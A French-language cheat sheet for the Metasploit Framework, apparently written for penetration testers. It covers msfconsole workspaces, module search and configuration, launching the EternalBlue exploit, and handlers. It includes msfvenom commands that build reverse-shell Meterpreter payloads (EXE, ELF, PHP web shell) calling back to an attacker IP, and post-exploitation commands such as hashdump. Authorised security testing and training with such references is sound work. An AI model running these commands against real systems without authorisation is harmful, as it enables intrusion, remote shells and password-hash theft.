# Metasploit Framework — msfconsole, Modules, Handlers & Sessions

---

## 1. Prise en Main & Workspaces

### Démarrage
```bash
# Démarrer la base de données PostgreSQL avant msfconsole
sudo systemctl start postgresql
sudo msfdb init       # initialise la DB (première utilisation)
msfconsole            # lancer msfconsole
msfconsole -q         # lancer sans la bannière (-q = quiet)
```

### Gestion de la base de données
```bash
msf6 > db_status           # vérifie la connexion à PostgreSQL
msf6 > db_disconnect       # se déconnecter de la DB
msf6 > db_connect          # se reconnecter
```

### Workspaces — Isolation par mission
```bash
msf6 > workspace                    # liste tous les workspaces (actif marqué *)
msf6 > workspace -a ClientA         # crée et active le workspace "ClientA"
msf6 > workspace ClientA            # bascule vers un workspace existant
msf6 > workspace -d ClientA         # supprime un workspace
msf6 > workspace -r old new         # renomme un workspace
```

### Import et scan dans la DB
```bash
# Importer un scan Nmap XML existant dans la DB
msf6 > db_import /tmp/scan.xml
```

```bash
# Lancer un scan Nmap depuis msfconsole et stocker les résultats directement
msf6 > db_nmap -sV -p- --open 192.168.1.0/24
```

```bash
# Consulter les hôtes et services enregistrés en DB
msf6 > hosts                        # liste les hôtes découverts
msf6 > services                     # liste les services détectés
msf6 > services -p 445              # filtrer les services par port
msf6 > vulns                        # liste les vulnérabilités identifiées
```

!!! note "Workspaces et isolation"
    Chaque workspace dispose de sa propre liste d'hôtes, services et sessions. Toujours créer un workspace dédié par mission pour éviter la pollution de données entre audits.

---

## 2. Navigation & Configuration de Modules

### Recherche de modules
```bash
msf6 > search eternalblue                          # recherche par nom
msf6 > search type:exploit platform:windows smb    # filtres combinés
msf6 > search cve:2021-44228                       # recherche par CVE
msf6 > search rank:excellent type:auxiliary        # filtrage par rang
```

### Rang des modules

| Rang | Signification |
| --- | --- |
| `Excellent` | Pas d'effet de bord, exploit fiable |
| `Great` | Fiable mais avec conditions spécifiques |
| `Good` | Fonctionne dans la plupart des configs standard |
| `Normal` | Peut manquer certaines configurations |
| `Average` / `Low` | Résultats inconsistants |
| `Manual` | Nécessite une interaction manuelle |

### Sélection et configuration
```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue   # charger un module par chemin
msf6 > use 0                                           # charger par numéro de la liste search
msf6 > info                                            # affiche description, auteur, CVE, options
msf6 > show options                                    # affiche les options configurables du module
msf6 > show advanced                                   # affiche les options avancées
msf6 > show payloads                                   # liste les payloads compatibles avec le module
```

### Définir les options
```bash
msf6 exploit(...) > set RHOSTS 192.168.1.50            # définit la cible (hôte ou CIDR ou fichier)
msf6 exploit(...) > set RPORT 445                      # port cible
msf6 exploit(...) > set LHOST 192.168.1.100            # IP de l'attaquant (listener)
msf6 exploit(...) > set LPORT 4444                     # port d'écoute
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp   # définir le payload
msf6 exploit(...) > set THREADS 10                     # options spécifiques au module
```

```bash
# setg : définit une option globalement pour tous les modules (persistant dans la session)
msf6 > setg LHOST 192.168.1.100
msf6 > setg LPORT 4444
```

```bash
msf6 exploit(...) > unset RHOSTS                       # réinitialise une option
msf6 > unsetg LHOST                                    # réinitialise une option globale
```

### Exécution
```bash
msf6 exploit(...) > run          # lance l'exploit (alias de exploit)
msf6 exploit(...) > exploit      # idem
msf6 exploit(...) > check        # vérifie si la cible est vulnérable sans exploiter
msf6 exploit(...) > run -j       # lance en tâche de fond (job)
```

### Navigation rapide
```bash
msf6 exploit(...) > back         # revient au contexte racine sans décharger le module
msf6 > previous                  # recharge le dernier module utilisé
msf6 > reload_all                # recharge tous les modules (après ajout d'un module custom)
```

---

## 3. Gestion des Handlers

### Module multi/handler — Configuration standard
```bash
msf6 > use exploit/multi/handler
```

```bash
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 0.0.0.0       # écoute sur toutes les interfaces
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > run -j                  # lance en arrière-plan (job)
```

### Options handler essentielles

| Option | Rôle | Valeur recommandée |
| --- | --- | --- |
| `LHOST` | IP d'écoute | IP de l'interface ou `0.0.0.0` |
| `LPORT` | Port d'écoute | `443`, `80`, `4444` |
| `PAYLOAD` | Type de payload attendu | Doit correspondre au payload généré |
| `ExitOnSession` | Ferme le handler après 1 session | `false` pour plusieurs cibles |
| `ReverseAllowProxy` | Accepte les connexions via proxy | `true` si pivot |

```bash
# Garder le handler actif pour plusieurs sessions simultanées
msf6 exploit(multi/handler) > set ExitOnSession false
msf6 exploit(multi/handler) > run -j
```

```bash
# Lister les jobs actifs (handlers, exploits en cours)
msf6 > jobs
msf6 > jobs -i 0          # détails du job 0
msf6 > kill 0             # arrête le job 0
msf6 > kill -a            # arrête tous les jobs
```

### Génération de payload avec msfvenom
```bash
# Payload Windows x64 Meterpreter reverse TCP (EXE)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe
```

```bash
# Payload Linux ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell.elf
```

```bash
# Payload PHP (web shell intégré)
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php
```

```bash
# Lister tous les payloads disponibles (filtré)
msfvenom -l payloads | grep "windows/x64"
```

!!! warning "staged vs stageless"
    `windows/x64/meterpreter/reverse_tcp` = **staged** (le payload est téléchargé depuis le handler en deux temps — requiert une connexion stable au handler). `windows/x64/meterpreter_reverse_tcp` (sans `/`) = **stageless** (payload complet embarqué dans l'exécutable — plus lourd mais autonome). Adapter selon le contexte réseau.

---

## 4. Gestion des Sessions

### Lister et interagir
```bash
msf6 > sessions                   # liste toutes les sessions actives (alias : sessions -l)
msf6 > sessions -i 1              # interagit avec la session 1
msf6 > sessions -u 1              # upgrade une session shell en Meterpreter
msf6 > sessions -k 1              # tue la session 1
msf6 > sessions -K                # tue toutes les sessions
```

### Passer une session en arrière-plan
```bash
# Depuis une session Meterpreter ou shell active :
meterpreter > background          # remet la session en arrière-plan
# ou
Ctrl+Z                            # suspend et remet en arrière-plan (confirmer avec y)
```

### Commandes Meterpreter essentielles (post-exploitation immédiate)
```bash
meterpreter > sysinfo             # infos système (OS, hostname, architecture)
meterpreter > getuid              # utilisateur courant
meterpreter > getpid              # PID du processus Meterpreter
meterpreter > ps                  # liste les processus
meterpreter > migrate <PID>       # migre vers un autre processus (persistance/élévation)
meterpreter > shell               # ouvre un shell OS interactif
meterpreter > upload src dst      # upload un fichier vers la cible
meterpreter > download src dst    # télécharge un fichier depuis la cible
meterpreter > hashdump            # dump les hashes de mots de passe (admin requis)
meterpreter > run post/multi/recon/local_exploit_suggester   # suggestions d'élévation de privilèges
```

### Tableau de synthèse — Commandes sessions

| Commande | Action |
| --- | --- |
| `sessions` / `sessions -l` | Liste toutes les sessions |
| `sessions -i N` | Interagit avec la session N |
| `sessions -u N` | Upgrade shell → Meterpreter |
| `sessions -k N` | Tue la session N |
| `sessions -K` | Tue toutes les sessions |
| `background` / `Ctrl+Z` | Remet la session en arrière-plan |
| `run -j` | Lance un module en job (arrière-plan) |
| `jobs` | Liste les jobs actifs |
| `kill N` | Arrête le job N |
